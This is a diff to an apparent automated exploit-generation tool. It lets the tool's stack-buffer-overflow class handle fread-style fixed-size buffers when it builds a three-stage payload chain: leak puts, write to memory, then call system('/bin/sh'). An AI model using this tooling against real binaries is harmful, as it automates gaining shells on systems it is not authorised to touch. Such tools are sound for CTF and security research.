@@ -59,6 +59,8 @@ class StackBufferOverflowVulnerability(Vulnerability):
             targetFunc,
             functionExit,
             stackOffset,
+            bufferFunction,
+            bufferSize : int = None,
             debug : bool = False):
         self.function = function
         self.binary = binary
@@ -66,6 +68,8 @@ class StackBufferOverflowVulnerability(Vulnerability):
         self.targetFunc = targetFunc
         self.stackOffset = stackOffset
         self.functionExit = functionExit
+        self.bufferFunction = bufferFunction
+        self.bufferSize = bufferSize
         self.debug = debug
     
     def __str__(self):
@@ -76,12 +80,17 @@ class StackBufferOverflowVulnerability(Vulnerability):
             "libc": str(self.libc),
             "targetFunc": str(self.targetFunc),
             "stackOffset": str(self.stackOffset),
+            "bufferFunction": str(self.bufferFunction),
             # TODO: Make these more useful / general
             # TODO: Unify this with options above
+            "bufferSize": str(self.bufferSize),
             "options": {
             }
         }
         return json.dumps(fields, indent=2)
+
+    def __format__(self, format_spec):
+        return self.__str__()
 
     # TODO: Make this a real thing.
     @staticmethod
@@ -109,6 +118,7 @@ class StackBufferOverflowVulnerability(Vulnerability):
             targetFunc=targetFunc,
             functionExit=function["exitAddresses"][0],
             stackOffset=stackOffset,
+            bufferFunction="gets",
             debug=debug)
 
     @staticmethod
@@ -132,6 +142,7 @@ class StackBufferOverflowVulnerability(Vulnerability):
                     targetFunc=call,
                     functionExit=function["exitAddresses"][0],
                     stackOffset=stackOffset,
+                    bufferFunction="read",
                     debug=debug)
     
     @staticmethod
@@ -155,6 +166,7 @@ class StackBufferOverflowVulnerability(Vulnerability):
                     targetFunc=call,
                     functionExit=function["exitAddresses"][0],
                     stackOffset=stackOffset,
+                    bufferFunction="fgets",
                     debug=debug)
     
     @staticmethod
@@ -178,6 +190,8 @@ class StackBufferOverflowVulnerability(Vulnerability):
                     targetFunc=call,
                     functionExit=function["exitAddresses"][0],
                     stackOffset=stackOffset,
+                    bufferFunction="fread",
+                    bufferSize=targetSize,
                     debug=debug)
 
     @staticmethod
@@ -234,7 +248,15 @@ class StackBufferOverflowVulnerability(Vulnerability):
         logger.info("Sending first payload (to leak 'puts' location)")
        
         payload1 = sm.resolve(binary=0x0, libc=0x0)
-        solution_payload = conn.scout(functionExit, [claripy.BVS("solution_payload1", size=8*prefixlen), claripy.BVV(payload1+b"\n")])
+        if self.bufferSize:
+            suffixSize = self.bufferSize - (prefixlen) - (len(payload1) + 1)
+            print(suffixSize)
+            solution_payload = conn.scout(functionExit, [claripy.BVS("solution_payload1", size=8*prefixlen),
+                                                         claripy.BVV(payload1+b"\n"),
+                                                         claripy.BVS("suffix_buffer1", size=8*suffixSize)])
+        else:
+            solution_payload = conn.scout(functionExit, [claripy.BVS("solution_payload1", size=8*prefixlen),
+                                                         claripy.BVV(payload1+b"\n")])
         logger.info(f"Solution Prefix Payload: {solution_payload}")
         conn.sim_send(solution_payload)
         sconn.send(solution_payload)
@@ -271,7 +293,14 @@ class StackBufferOverflowVulnerability(Vulnerability):
         payload2 = sm.resolve(binary=0x0)
         
         logger.info("Sending second payload (setup write to controlled memory)")
-        solution_payload = conn.scout(functionExit, [claripy.BVS("solution_payload2_prefix", size=8*prefixlen), claripy.BVV(payload2+b"\n")])
+        if self.bufferSize:
+            suffixSize = self.bufferSize - (prefixlen) - (len(payload2) + 1)
+            solution_payload = conn.scout(functionExit, [claripy.BVS("solution_payload2", size=8*prefixlen),
+                                                         claripy.BVV(payload2+b"\n"),
+                                                         claripy.BVS("suffix_buffer2", size=8*suffixSize)])
+        else:
+            solution_payload = conn.scout(functionExit, [claripy.BVS("solution_payload2", size=8*prefixlen),
+                                                         claripy.BVV(payload2+b"\n")])
         conn.sim_send(solution_payload)
         sconn.send(solution_payload)
         logger.info("Navigating to return.")
@@ -306,7 +335,14 @@ class StackBufferOverflowVulnerability(Vulnerability):
         payload3 = sm.resolve(binary=0x0, libc=libcoffset)
 
         logger.info("Sending final payload (invoke system('bin/sh'))")
-        solution_payload = conn.scout(functionExit, [claripy.BVS("solution_payload_prefix3", size=8*prefixlen), claripy.BVV(payload3+b"\n")])
+        if self.bufferSize:
+            suffixSize = self.bufferSize - (prefixlen) - (len(payload3) + 1)
+            solution_payload = conn.scout(functionExit, [claripy.BVS("solution_payload3", size=8*prefixlen),
+                                                         claripy.BVV(payload3+b"\n"),
+                                                         claripy.BVS("suffix_buffer3", size=8*suffixSize)])
+        else:
+            solution_payload = conn.scout(functionExit, [claripy.BVS("solution_payload3", size=8*prefixlen),
+                                                         claripy.BVV(payload3+b"\n")])
         conn.sim_send(solution_payload)
         sconn.send(solution_payload)
         self.dpause(conn)
